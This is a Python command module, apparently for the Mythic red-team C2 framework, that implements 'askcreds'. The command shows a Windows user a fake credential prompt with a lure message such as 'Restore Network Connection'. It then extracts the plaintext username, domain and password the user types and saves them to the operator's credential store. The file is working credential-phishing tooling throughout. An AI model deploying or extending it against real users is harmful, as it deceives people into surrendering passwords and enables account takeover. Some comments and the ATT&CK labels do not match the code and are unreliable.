from mythic_container.MythicRPC import *
from mythic_container.MythicCommandBase import *
import json

class AskCredsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="reason",
                type=ParameterType.String,
                description="Reason to display to the user for credential prompt",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=1,
                    required=False
                )]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                try:
                    self.load_args_from_json_string(self.command_line)
                except:
                    raise ValueError("Unable to parse JSON from command line")
            else:
                self.set_arg("reason", self.command_line)
        else:
            self.set_arg("reason", "Restore Network Connection")


class AskCredsCommand(CommandBase):
    cmd = "askcreds"
    needs_admin = False
    help_cmd = "askcreds [reason]"
    description = "Prompt the user for credentials using Windows Credential UI. Optionally provide a reason message."
    version = 1
    supported_ui_features = []
    author = "@checkymander"
    attackmapping = ["T1115", "T1056.001"]  # Input Capture & Credential API Hooking
    argument_class = AskCredsArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]  # Only Windows is supported for this command
    )
    
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        # Set the display parameters based on whether a reason was provided
        reason = taskData.args.get_arg("reason")
        if reason and reason != "Restore Network Connection":
            response.DisplayParams = f"Prompting user for credentials with reason: {reason}"
        else:
            response.DisplayParams = "Prompting user for credentials with default reason"
        
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the agent response containing captured credentials
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        try:
            if response:
                # The response should be the credential output as a string
                response_text = str(response)
                
                # Check if credentials were successfully captured
                if "[+] Credentials captured successfully!" in response_text:
                    # Create a task response output
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=response_text.encode()
                    ))
                    
                    # Also update the task output in the database
                    await SendMythicRPCResponseUpdate(MythicRPCResponseUpdateMessage(
                        TaskID=task.Task.ID,
                        Response=response_text
                    ))
                    
                    # You could also extract and store credentials in the credential store
                    await self._extract_and_store_credentials(task, response_text)
                    
                else:
                    # Handle error or cancellation
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=response_text.encode()
                    ))
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response="No response received from agent".encode()
                ))
                
        except Exception as e:
            # Handle any processing errors
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"Error processing askcreds response: {str(e)}".encode()
            ))
            resp.Success = False
            resp.Error = str(e)
            
        return resp

    async def _extract_and_store_credentials(self, task: PTTaskMessageAllData, response_text: str):
        """
        Extract credentials from the response and optionally store them in Mythic's credential store
        """
        try:
            lines = response_text.split('\n')
            credentials = {}
            
            for line in lines:
                if '[+] Username:' in line:
                    credentials['username'] = line.split('[+] Username: ')[1].strip()
                elif '[+] Domain:' in line:
                    credentials['domain'] = line.split('[+] Domain: ')[1].strip()
                elif '[+] Password:' in line:
                    credentials['password'] = line.split('[+] Password: ')[1].strip()
            
            # If we have both username and password, we could store them
            if 'username' in credentials and 'password' in credentials:
                # Build the full account identifier
                if 'domain' in credentials and credentials['domain']:
                    account = f"{credentials['domain']}\\{credentials['username']}"
                else:
                    account = credentials['username']
                
                # Credential in Mythic's store (optional - uncomment if you want this)
                await SendMythicRPCCredentialCreate(MythicRPCcredentialCreateMessage(
                    TaskID=task.Task.ID,
                    Credentials=[
                        MythicRPCcredentialData(
                            credential_type="plaintext",
                            account=account,
                            realm=credentials.get('domain', ''),
                            credential=credentials['password'],
                            comment="Captured via askcreds command",
                            metadata={"captured_from": "windows_credential_ui"}
                        )
                    ]
                ))
                
                # Log that we captured credentials (for debugging)
                await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                    TaskID=task.Task.ID,
                    Message=f"Captured credentials for: {account}",
                    Level="info"
                ))
                
        except Exception as e:
            # If credential extraction fails, just log it but don't fail the task
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                TaskID=task.Task.ID,
                Message=f"Failed to extract credentials from response: {str(e)}",
                Level="warning"
            ))